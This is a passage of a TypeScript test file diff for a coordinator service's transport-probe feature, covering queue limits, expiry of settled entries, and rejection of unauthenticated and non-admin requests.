++    const first = f.trusted.claim(f.identity);
++    await entered.promise;
++    const waiting = Array.from({ length: 7 }, () => f.registry.claim(controller, f.identity));
++    await expect(f.trusted.openTransportProbe(f.request)).rejects.toThrow("queue is full");
++    release.resolve();
++    await first;
++    await Promise.all(waiting);
++    await expect(f.trusted.openTransportProbe(f.request)).rejects.toThrow("active");
++  });
++
++  it("retains the bounded settled tombstone until expiry, then reuses one slot", async () => {
++    const f = fixture();
++    await f.trusted.openTransportProbe(f.request);
++    await f.trusted.settleTransportProbe(f.request.challenge, false);
++    const later = Date.now() + 10 * 60_000;
++    vi.spyOn(Date, "now").mockReturnValue(later);
++    await expect(f.trusted.openTransportProbe(f.request)).rejects.toThrow("expiry");
++    await f.trusted.openTransportProbe({
++      ...f.request,
++      challenge: "c".repeat(64),
++      expiresAt: new Date(later + 9 * 60_000).toISOString(),
++    });
++    expect(f.storage.values.size).toBe(1);
++  });
++});
++describe("narrow candidate probe route", () => {
++  it("normal auth rejects an unauthenticated request before dispatch", async () => {
++    const fleet = vi.fn<() => Promise<Response>>(async () => new Response());
++    const response = await routeCoordinatorRequest(
++      new Request("https://fixture.invalid/v1/qualification/transport-probe", {
++        method: "POST",
++        body: JSON.stringify({ challenge: "b".repeat(64) }),
++      }),
++      { CRABBOX_ADMIN_TOKEN: "a".repeat(64) } as Env,
++      fleet,
++    );
++    expect(response.status).toBe(401);
++    expect(fleet).not.toHaveBeenCalled();
++  });
++  it("accepts only an admin nonce, no Fleet or run operation", async () => {
++    const observeBinding = vi.fn<() => Promise<void>>(async () => {});
++    const env = { CRABBOX_AWS_QUALIFICATION_TRANSPORT: { observeBinding } } as unknown as Env;
++    const request = (body: unknown, admin = true) =>
++      new Request("https://fixture.invalid/v1/qualification/transport-probe", {
++        method: "POST",
++        headers: { "x-crabbox-admin": String(admin) },
++        body: JSON.stringify(body),
++      });
++    expect(
++      (await qualificationTransportProbeResponse(request({ challenge: "b".repeat(64) }), env))
++        ?.status,
++    ).toBe(200);
++    expect(
++      (
++        await qualificationTransportProbeResponse(
++          request({ challenge: "b".repeat(64), props: {} }),
++          env,
++        )
++      )?.status,
++    ).toBe(409);
++    expect(
++      (
++        await qualificationTransportProbeResponse(
++          request({ challenge: "b".repeat(64) }, false),
++          env,
++        )
++      )?.status,
++    ).toBe(404);
++    expect(observeBinding).toHaveBeenCalledExactlyOnceWith("b".repeat(64));
++  });
++});
